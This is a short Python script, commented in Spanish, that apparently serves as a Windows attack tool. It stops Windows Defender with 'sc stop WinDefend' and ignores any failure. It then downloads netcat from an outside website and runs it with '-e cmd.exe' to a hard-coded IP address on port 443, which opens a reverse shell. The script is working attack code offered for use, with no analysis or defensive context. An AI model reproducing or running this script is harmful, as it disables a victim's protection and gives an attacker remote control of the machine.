import os
import shutil
import subprocess

# Reemplaza 'comando_para_desactivar_antivirus' con el comando específico de tu antivirus
comando = 'sc stop WinDefend'
ip = '192.168.0.12'

try:
    # Ejecutar el comando para desactivar el antivirus
    subprocess.run(comando, shell=True, check=True)
    print("Antivirus desactivado temporalmente.")
except subprocess.CalledProcessError as e:
    pass

os.system("curl https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip -o netcat.zip")
shutil.unpack_archive("netcat.zip")
os.chdir("netcat-1.11")
os.system(f"nc64.exe {ip} 443 -e cmd.exe")